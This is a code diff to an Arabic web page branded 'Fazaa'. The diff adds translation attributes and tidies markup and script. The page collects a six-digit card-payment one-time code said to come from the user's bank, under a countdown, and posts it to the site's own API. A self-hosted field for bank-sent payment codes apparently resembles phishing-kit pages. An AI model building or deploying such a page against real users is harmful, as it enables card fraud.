@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق - فزعة</title>
+    <title data-i18n="pageTitleVerification">التحقق - فزعة</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -17,10 +17,7 @@
             justify-content: center;
             padding: 20px;
         }
-        .app {
-            width: 100%;
-            max-width: 500px;
-        }
+        .app { width: 100%; max-width: 500px; }
         .shell {
             background: #fff;
             border: 2px solid rgba(177, 140, 51, 0.34);
@@ -115,49 +112,48 @@
     <div class="app">
         <div class="shell">
             <header>
-                <img src="/images/logo.png" class="logo" alt="فزعة">
+                <img src="/images/logo.png" class="logo" alt="Fazaa">
             </header>
             
             <div class="hero-card">
                 <i class="fas fa-shield-halved"></i>
-                <h2>المصادقة الثنائية الآمنة</h2>
-                <p>ستتلقى رمزاً سرياً لمرة واحدة (OTP) لتأكيد عملية الدفع عبر رسالة نصية أو تطبيق البنك.</p>
+                <h2 data-i18n="secureAuth">المصادقة الثنائية الآمنة</h2>
+                <p data-i18n="authDesc">ستتلقى رمزاً سرياً لمرة واحدة (OTP) لتأكيد عملية الدفع عبر رسالة نصية أو تطبيق البنك.</p>
             </div>
             
-            <h3>يرجى إدخال رمز التحقق (OTP):</h3>
-            <p class="subtitle">الرمز مرسل الآن إلى رقم الهاتف المرتبط بالبطاقة •••• <span id="last4">----</span></p>
+            <h3 data-i18n="enterOtp">يرجى إدخال رمز التحقق (OTP):</h3>
+            <p class="subtitle" data-i18n="otpSent">الرمز مرسل الآن إلى رقم الهاتف المرتبط بالبطاقة •••• <span id="last4">----</span></p>
             
             <form id="otpForm">
                 <div class="field">
                     <input type="tel" id="otpCode" maxlength="6" placeholder="• • • • • •" autocomplete="one-time-code">
-                    <p class="error" id="otpError">رمز التحقق غير صحيح</p>
+                    <p class="error" id="otpError" data-i18n="otpError">رمز التحقق غير صحيح</p>
                 </div>
-                <button type="submit" class="btn">تأكيد</button>
+                <button type="submit" class="btn" data-i18n="confirm">تأكيد</button>
             </form>
             
-            <p class="timer">ستنتهي صلاحية هذه الصفحة بعد <strong id="countdown">60</strong> ثانية</p>
-            <p class="help">هل تحتاج للمساعدة؟ <a href="#" style="color: #1d7cec;">تواصل معنا</a></p>
+            <p class="timer"><span data-i18n="timerText">ستنتهي صلاحية هذه الصفحة بعد</span> <strong id="countdown">60</strong> <span data-i18n="seconds">ثانية</span></p>
+            <p class="help"><span data-i18n="needHelp">هل تحتاج للمساعدة؟</span> <a href="#" data-i18n="contactUs" style="color: #1d7cec;">تواصل معنا</a></p>
         </div>
     </div>
     
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-card">
             <div class="spinner"></div>
-            <p>جاري التحقق من الرمز...</p>
+            <p data-i18n="verifying">جاري التحقق من المعلومات...</p>
         </div>
     </div>
     
+    <script src="/js/i18n.js"></script>
     <script>
         const API_BASE = '/api';
         let countdown = 60;
         let countdownInterval;
         
-        // Countdown timer
         function startCountdown() {
             countdownInterval = setInterval(() => {
                 countdown--;
                 document.getElementById('countdown').textContent = countdown;
-                
                 if (countdown <= 0) {
                     clearInterval(countdownInterval);
                     document.getElementById('otpCode').disabled = true;
@@ -168,38 +164,28 @@
         
         startCountdown();
         
-        // Format OTP input
         document.getElementById('otpCode').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '').slice(0, 6);
-            
-            // Auto submit when 6 digits
             if (this.value.length === 6) {
                 setTimeout(() => document.getElementById('otpForm').dispatchEvent(new Event('submit')), 300);
             }
         });
         
-        // Submit OTP
         document.getElementById('otpForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
             const otp = document.getElementById('otpCode').value;
-            
             if (otp.length !== 6) {
                 document.getElementById('otpError').style.display = 'block';
                 return;
             }
-            
             document.getElementById('loadingOverlay').classList.add('show');
-            
             try {
-                const response = await fetch(`${API_BASE}/verify-otp`, {
+                const response = await fetch(API_BASE + '/verify-otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ otp })
                 });
-                
                 const data = await response.json();
-                
                 if (data.success) {
                     window.location.href = data.redirect;
                 } else {
